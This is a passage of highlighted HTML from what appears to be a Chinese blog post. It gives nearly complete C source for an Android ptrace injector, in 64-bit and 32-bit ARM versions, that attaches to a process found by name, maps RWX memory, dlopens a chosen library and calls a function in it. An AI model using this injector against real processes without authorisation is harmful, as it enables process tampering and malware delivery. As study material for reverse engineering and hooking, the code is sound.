class="number">8</span>;i++)&#123;</span><br><span class="line">        regs-&gt;uregs[i]=paras[i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 调用函数</span></span><br><span class="line">    regs-&gt;ARM_pc=(<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span>)funcAddr;</span><br><span class="line">    <span class="comment">// 判断arm模式还是thumb模式</span></span><br><span class="line">    <span class="keyword">if</span>(regs-&gt;ARM_pc&amp;<span class="number">1</span>)&#123;</span><br><span class="line">        regs-&gt;ARM_pc&amp;=~<span class="number">1</span>;</span><br><span class="line">        regs-&gt;ARM_cpsr|=CPSR_T_MASK;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        regs-&gt;ARM_cpsr&amp;=~CPSR_T_MASK;</span><br><span class="line">    &#125;</span><br><span class="line">    regs-&gt;ARM_lr=<span class="number">0</span>;</span><br><span class="line">    ptraceSetRegs(pid,regs);</span><br><span class="line">    <span class="keyword">int</span> stat=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>(stat!=<span class="number">0xb7f</span>)&#123;</span><br><span class="line">        ptraceContinue(pid);</span><br><span class="line">        waitpid(pid,&amp;stat,WUNTRACED);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[INJECT] substatus: %x\n&quot;</span>,stat);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ptraceGetRegs(pid,regs);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">inject</span><span class="params">(<span class="keyword">pid_t</span> pid,<span class="keyword">const</span> <span class="keyword">char</span>*libname,<span class="keyword">const</span> <span class="keyword">char</span>*funcName)</span></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pt_regs</span> <span class="title">oldRegs</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pt_regs</span> <span class="title">regs</span>;</span></span><br><span class="line">    <span class="keyword">long</span> paras[<span class="number">6</span>];</span><br><span class="line">    <span class="keyword">char</span> realLibPath[PATH_MAX];</span><br><span class="line">    realpath(libname,realLibPath);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[INJECT]Real path of lib found:%s\n&quot;</span>,realLibPath);</span><br><span class="line"></span><br><span class="line">    ptraceAttach(pid);</span><br><span class="line">    <span class="comment">// 保存寄存器环境</span></span><br><span class="line">    ptraceGetRegs(pid,&amp;oldRegs);</span><br><span class="line">    <span class="built_in">memcpy</span>(&amp;regs,&amp;oldRegs,<span class="keyword">sizeof</span>(struct pt_regs));</span><br><span class="line">    <span class="comment">// 获取mmap地址</span></span><br><span class="line">    <span class="keyword">void</span> *mmapAddr = getRemoteFuncAddr(pid,libcPath,(<span class="keyword">void</span>*)mmap);</span><br><span class="line">    <span class="comment">// 调用mmap</span></span><br><span class="line">    paras[<span class="number">0</span>]=<span class="number">0</span>;</span><br><span class="line">    paras[<span class="number">1</span>]=<span class="number">0x1000</span>;</span><br><span class="line">    paras[<span class="number">2</span>]=PROT_READ|PROT_WRITE|PROT_EXEC;</span><br><span class="line">    paras[<span class="number">3</span>]=MAP_ANONYMOUS|MAP_PRIVATE;</span><br><span class="line">    paras[<span class="number">4</span>]=<span class="number">0</span>;</span><br><span class="line">    paras[<span class="number">5</span>]=<span class="number">0</span>;</span><br><span class="line">    ptraceCall(pid,mmapAddr,paras,<span class="number">6</span>,&amp;regs);</span><br><span class="line">    <span class="keyword">void</span> *remoteMemAddr=(<span class="keyword">void</span>*)regs.ARM_r0;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[INJECT] remote mmaped addr:%p\n&quot;</span>,remoteMemAddr);</span><br><span class="line">    <span class="comment">// 调用dlopen</span></span><br><span class="line">    <span class="keyword">void</span> *dlopenAddr=getRemoteFuncAddr(pid,libcPath,(<span class="keyword">void</span>*)dlopen);</span><br><span class="line">    <span class="keyword">void</span> *dlcloseAddr=getRemoteFuncAddr(pid,libcPath,(<span class="keyword">void</span>*)dlclose);</span><br><span class="line">    <span class="keyword">void</span> *dlErrorAddr=getRemoteFuncAddr(pid,libcPath,(<span class="keyword">void</span>*)dlerror);</span><br><span class="line">    ptraceWriteData(pid,remoteMemAddr,realLibPath,<span class="built_in">strlen</span>(realLibPath)+<span class="number">1</span>);   <span class="comment">// 作为dlopen的参数</span></span><br><span class="line">    <span class="comment">//debug start</span></span><br><span class="line">    <span class="keyword">char</span> buf[MAX_PATH];</span><br><span class="line">    <span class="built_in">memset</span>(buf,<span class="number">0</span>,MAX_PATH);</span><br><span class="line">    ptraceReadData(pid,remoteMemAddr,buf,<span class="built_in">strlen</span>(realLibPath)+<span class="number">3</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>,buf);</span><br><span class="line">    <span class="comment">//debug end</span></span><br><span class="line">    paras[<span class="number">0</span>]=(<span class="keyword">long</span>)remoteMemAddr;</span><br><span class="line">    paras[<span class="number">1</span>]=RTLD_NOW|RTLD_GLOBAL;</span><br><span class="line">    ptraceCall(pid,dlopenAddr,paras,<span class="number">2</span>,&amp;regs);</span><br><span class="line">    <span class="keyword">void</span>*libBaseAddr=(<span class="keyword">void</span>*)regs.ARM_r0;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[INJECT]remote lib base:0x%llx of %s\n&quot;</span>,(<span class="keyword">long</span> <span class="keyword">long</span>)libBaseAddr,realLibPath);</span><br><span class="line">    <span class="comment">// 调用dlsym</span></span><br><span class="line">    <span class="keyword">void</span>*dlsymAddr=getRemoteFuncAddr(pid,libcPath,(<span class="keyword">void</span>*)dlsym);</span><br><span class="line">    ptraceWriteData(pid,remoteMemAddr,funcName,<span class="built_in">strlen</span>(funcName)+<span class="number">1</span>);</span><br><span class="line">    <span class="comment">//debug start</span></span><br><span class="line">    <span class="built_in">memset</span>(buf,<span class="number">0</span>,MAX_PATH);</span><br><span class="line">    ptraceReadData(pid,remoteMemAddr,buf,<span class="built_in">strlen</span>(funcName)+<span class="number">3</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>,buf);</span><br><span class="line">    <span class="comment">//debug end</span></span><br><span class="line">    paras[<span class="number">0</span>]=(<span class="keyword">long</span>)libBaseAddr;</span><br><span class="line">    paras[<span class="number">1</span>]=(<span class="keyword">long</span>)remoteMemAddr;</span><br><span class="line">    ptraceCall(pid,dlsymAddr,paras,<span class="number">2</span>,&amp;regs);</span><br><span class="line">    <span class="keyword">void</span>*remoteFuncAddr = (<span class="keyword">void</span>*)regs.ARM_r0;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[INJECT]addr:0x%llx of func %s\n&quot;</span>,(<span class="keyword">long</span> <span class="keyword">long</span>)remoteFuncAddr,funcName);</span><br><span class="line">    <span class="comment">// 调用目标函数</span></span><br><span class="line">    ptraceCall(pid,remoteFuncAddr,paras,<span class="number">0</span>,&amp;regs);</span><br><span class="line">    <span class="comment">// 恢复寄存器环境</span></span><br><span class="line">    ptraceSetRegs(pid,&amp;oldRegs);</span><br><span class="line">    ptraceDetach(pid);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">pid_t</span> <span class="title">findPIdByName</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *name)</span></span>&#123;</span><br><span class="line">    <span class="keyword">pid_t</span> pid = <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">int</span> pDirId = <span class="number">0</span>; <span class="comment">// process dir id</span></span><br><span class="line">    FILE *f;</span><br><span class="line">    <span class="keyword">char</span> filename[MAX_PATH];</span><br><span class="line">    <span class="keyword">char</span> cmdline[MAX_PATH];</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">dirent</span> *<span class="title">entry</span>=<span class="title">NULL</span>;</span></span><br><span class="line">    <span class="keyword">int</span> cnt;</span><br><span class="line">    <span class="keyword">if</span>(name==<span class="literal">NULL</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    DIR *dir = opendir(<span class="string">&quot;/proc&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(dir==<span class="literal">NULL</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>((entry=readdir(dir))!=<span class="literal">NULL</span>)&#123;</span><br><span class="line">        pDirId=atoi(entry-&gt;d_name);</span><br><span class="line">        <span class="keyword">if</span>(pDirId!=<span class="number">0</span>)&#123;</span><br><span class="line">            <span class="built_in">snprintf</span>(filename,MAX_PATH,<span class="string">&quot;/proc/%d/cmdline&quot;</span>,pDirId);</span><br><span class="line">            f = fopen(filename,<span class="string">&quot;r&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span>(f)&#123;</span><br><span class="line">                fgets(cmdline,<span class="keyword">sizeof</span>(cmdline),f);</span><br><span class="line">                cnt = (<span class="keyword">int</span>)<span class="built_in">strlen</span>(cmdline);</span><br><span class="line">                <span class="keyword">while</span>(cnt&gt;=<span class="number">0</span>&amp;&amp;cmdline[cnt]!=<span class="string">&#x27;/&#x27;</span>)cnt--; <span class="comment">// cmdline是完整路径，这里只找最后一个/之后的，就是可执行文件的文件名</span></span><br><span class="line">                cnt++;</span><br><span class="line">                <span class="keyword">if</span>(!<span class="built_in">strncmp</span>(name,&amp;cmdline[cnt],<span class="built_in">strlen</span>(name)))&#123;</span><br><span class="line">                    pid=pDirId;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            fclose(f);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    closedir(dir);</span><br><span class="line">    <span class="keyword">return</span> pid;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">char</span> **argv)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(argc!=<span class="number">4</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;usage: inject processname libexample.so funcname\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">pid_t</span> pid = findPIdByName(argv[<span class="number">1</span>]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[INJECT]found pid:%d of %s\n&quot;</span>,pid,argv[<span class="number">1</span>]);</span><br><span class="line">    inject(pid,argv[<span class="number">2</span>],argv[<span class="number">3</span>]);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>32位注入器</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/user.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;asm/ptrace.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ptrace.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;dlfcn.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;dirent.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;elf.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/uio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CPSR_T_MASK (1u&lt;&lt;5)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAX_PATH 512</span></span><br><span class="line"><span class="keyword">char</span> libcPath[]=<span class="string">&quot;/system/lib/libc.so&quot;</span>;</span><br><span class="line"><span class="keyword">char</span> linkerPath[] = <span class="string">&quot;/system/bin/linker&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">ptraceWriteData</span><span class="params">(<span class="keyword">pid_t</span> pid,<span class="keyword">void</span>*addr,<span class="keyword">const</span> <span class="keyword">char</span>*data,<span class="keyword">size_t</span> len)</span></span>&#123;</span><br><span class="line">    <span class="keyword">size_t</span> i=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(;i&lt;len;i+=<span class="keyword">sizeof</span>(<span class="keyword">long</span>))&#123;</span><br><span class="line">        ptrace(PTRACE_POKETEXT,pid,(<span class="keyword">long</span>)addr+i,(<span class="keyword">void</span>*)*(<span class="keyword">long</span>*)&amp;data[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 每次写sizeof(long)字节，直接对齐</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">ptraceReadData</span><span class="params">(<span class="keyword">pid_t</span> pid,<span class="keyword">void</span>*addr,<span class="keyword">char</span>*data,<span class="keyword">size_t</span> len)</span></span>&#123;</span><br><span class="line">    <span class="keyword">size_t</span> i=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">long</span> rdata;</span><br><span class="line">    <span class="keyword">for</span>(;i&lt;len;i+=<span class="keyword">sizeof</span>(<span class="keyword">long</span>))&#123;</span><br><span class="line">        rdata=ptrace(PTRACE_PEEKTEXT,pid,(<span class="keyword">long</span>)addr+i,<span class="literal">NULL</span>);</span><br><span class="line">        *(<span class="keyword">long</span>*)&amp;data[i]=rdata;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">ptraceAttach</span><span class="params">(<span class="keyword">pid_t</span> pid)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(ptrace(PTRACE_ATTACH,pid,<span class="literal">NULL</span>,<span class="literal">NULL</span>)==<span class="number">-1</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[INJECT F]Failed to attach:%d\n&quot;</span>,pid);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> stat=<span class="number">0</span>;</span><br><span class="line">    waitpid(pid,&amp;stat,WUNTRACED);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">ptraceGetRegs</span><span class="params">(<span class="keyword">pid_t</span> pid,struct pt_regs*regs_addr)</span></span>&#123;</span><br><span class="line"><span class="comment">//    struct iovec io;</span></span><br><span class="line"><span class="comment">//    io.iov_base=regs_addr;</span></span><br><span class="line"><span class="comment">//    io.iov_len=sizeof(struct pt_regs);</span></span><br><span class="line">    <span class="keyword">if</span>(ptrace(PTRACE_GETREGS,pid,<span class="literal">NULL</span>,regs_addr)==<span class="number">-1</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Get regs error\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">ptraceSetRegs</span><span class="params">(<span class="keyword">pid_t</span> pid,struct pt_regs*regs_addr)</span></span>&#123;</span><br><span class="line"><span class="comment">//    struct iovec io;</span></span><br><span class="line"><span class="comment">//    io.iov_base = regs_addr;</span></span><br><span class="line"><span class="comment">//    io.iov_len = sizeof(struct pt_regs);</span></span><br><span class="line">    <span class="keyword">if</span>(ptrace(PTRACE_SETREGS,pid,<span class="literal">NULL</span>,regs_addr)==<span class="number">-1</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Set regs error\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">ptraceDetach</span><span class="params">(<span class="keyword">pid_t</span> pid)</span></span>&#123;</span><br><span class="line">    ptrace(PTRACE_DETACH,pid,<span class="literal">NULL</span>,<span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">ptraceContinue</span><span class="params">(<span class="keyword">pid_t</span> pid)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(ptrace(PTRACE_CONT,pid,<span class="literal">NULL</span>,<span class="literal">NULL</span>)==<span class="number">-1</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;ptrace continue error\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">getModuleBaseAddr</span><span class="params">(<span class="keyword">pid_t</span> pid,<span class="keyword">const</span> <span class="keyword">char</span>*moduleName)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(pid==<span class="number">-1</span>)pid=getpid();</span><br><span class="line">    <span class="comment">// 通过解析/proc/pid/maps 获得基址</span></span><br><span class="line">    <span class="keyword">char</span> filepath[MAX_PATH];</span><br><span class="line">    <span class="keyword">void</span>*moduleBaseAddr=<span class="literal">NULL</span>;</span><br><span class="line">    <span class="built_in">snprintf</span>(filepath,MAX_PATH,<span class="string">&quot;/proc/%d/maps&quot;</span>,pid);</span><br><span class="line">    FILE *f = fopen(filepath,<span class="string">&quot;r&quot;</span>);</span><br><span class="line">    <span class="keyword">char</span> line[MAX_PATH];</span><br><span class="line">    <span class="keyword">char</span> base[MAX_PATH],name[MAX_PATH];</span><br><span class="line">    <span class="keyword">size_t</span> cnt,start;</span><br><span class="line">    <span class="keyword">while</span>(!feof(f))&#123;</span><br><span class="line">        <span class="built_in">memset</span>(line,<span class="number">0</span>,MAX_PATH);</span><br><span class="line">        <span class="built_in">memset</span>(name,<span class="number">0</span>,MAX_PATH);</span><br><span class="line">        fgets(line,MAX_PATH,f);</span><br><span class="line">        cnt=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span>(line[cnt]!=<span class="string">&#x27;/&#x27;</span>)cnt++;</span><br><span class="line">        start=cnt;</span><br><span class="line">        <span class="keyword">while</span>(line[cnt])&#123;</span><br><span class="line">            name[cnt-start]=line[cnt];</span><br><span class="line">            cnt++;</span><br><span class="line">        &#125;</span><br><span class="line">        name[cnt-start<span class="number">-1</span>]=<span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">strncmp</span>(name,moduleName,MAX_PATH))<span class="keyword">continue</span>;</span><br><span class="line">        <span class="built_in">memset</span>(base,<span class="number">0</span>,MAX_PATH);</span><br><span class="line">        cnt=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span>(line[cnt]!=<span class="string">&#x27;-&#x27;</span>)&#123;</span><br><span class="line">            base[cnt]=line[cnt];</span><br><span class="line">            cnt++;</span><br><span class="line">        &#125;</span><br><span class="line">        base[cnt]=<span class="number">0</span>;</span><br><span class="line">        <span class="built_in">sscanf</span>(base,<span class="string">&quot;%x&quot;</span>,(<span class="keyword">unsigned</span> <span class="keyword">int</span>*)(&amp;moduleBaseAddr));</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[INJECT] GotBaseAddr %p of %s\n&quot;</span>,moduleBaseAddr,moduleName);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    fclose(f);</span><br><span class="line">    <span class="keyword">return</span> moduleBaseAddr;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">getRemoteFuncAddr</span><span class="params">(<span class="keyword">pid_t</span> pid,<span class="keyword">const</span> <span class="keyword">char</span> *moduleName,<span class="keyword">void</span> *localFuncAddr)</span></span>&#123;</span><br><span class="line">    <span class="keyword">void</span> *localModuleAddr,*remoteModuleAddr,*remoteFuncAddr;</span><br><span class="line">    <span class="comment">// 通过计算指定函数的偏移量获取目标函数地址</span></span><br><span class="line">    localModuleAddr = getModuleBaseAddr(<span class="number">-1</span>,moduleName);</span><br><span class="line">    remoteModuleAddr = getModuleBaseAddr(pid,moduleName);</span><br><span class="line">    remoteFuncAddr=(<span class="keyword">void</span>*)((<span class="keyword">long</span>)localFuncAddr-(<span class="keyword">long</span>)localModuleAddr+(<span class="keyword">long</span>)remoteModuleAddr);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[INJECT] GotFuncAddr:%p\n&quot;</span>,remoteFuncAddr);</span><br><span class="line">    <span class="keyword">return</span> remoteFuncAddr;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">ptraceCall</span><span class="params">(<span class="keyword">pid_t</span> pid,<span class="keyword">void</span>* funcAddr,<span class="keyword">long</span>*paras,<span class="keyword">long</span> paraLen,struct pt_regs *regs)</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 多于4个参数通过栈传递</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(paraLen&gt;<span class="number">4</span>)&#123;</span><br><span class="line"></span><br><span class="line">        regs-&gt;ARM_sp-=(paraLen<span class="number">-4</span>)*<span class="keyword">sizeof</span>(<span class="keyword">long</span>);</span><br><span class="line">        ptraceWriteData(pid,(<span class="keyword">void</span>*)regs-&gt;ARM_sp,(<span class="keyword">char</span>*)&amp;paras[<span class="number">6</span>],<span class="keyword">sizeof</span>(<span class="keyword">long</span>)*(paraLen<span class="number">-6</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 前6个参数通过寄存器传递</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">size_t</span> i=<span class="number">0</span>;i&lt;<span class="number">4</span>;i++)&#123;</span><br><span class="line">        regs-&gt;uregs[i]=paras[i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 调用函数</span></span><br><span class="line">    regs-&gt;ARM_pc=(<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span>)funcAddr;</span><br><span class="line">    <span class="comment">// 判断arm模式还是thumb模式</span></span><br><span class="line">    <span class="keyword">if</span>(regs-&gt;ARM_pc&amp;<span class="number">1</span>)&#123;</span><br><span class="line">        regs-&gt;ARM_pc&amp;=~<span class="number">1</span>;</span><br><span class="line">        regs-&gt;ARM_cpsr|=CPSR_T_MASK;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        regs-&gt;ARM_cpsr&amp;=~CPSR_T_MASK;</span><br><span class="line">    &#125;</span><br><span class="line">    regs-&gt;ARM_lr=<span class="number">0</span>;</span><br><span class="line">    ptraceSetRegs(pid,regs);</span><br><span class="line">    <span class="keyword">int</span> stat=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>(stat!=<span class="number">0xb7f</span>)&#123;</span><br><span class="line">        ptraceContinue(pid);</span><br><span class="line">        waitpid(pid,&amp;stat,WUNTRACED);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[INJECT] substatus: %x\n&quot;</span>,stat);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ptraceGetRegs(pid,regs);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span 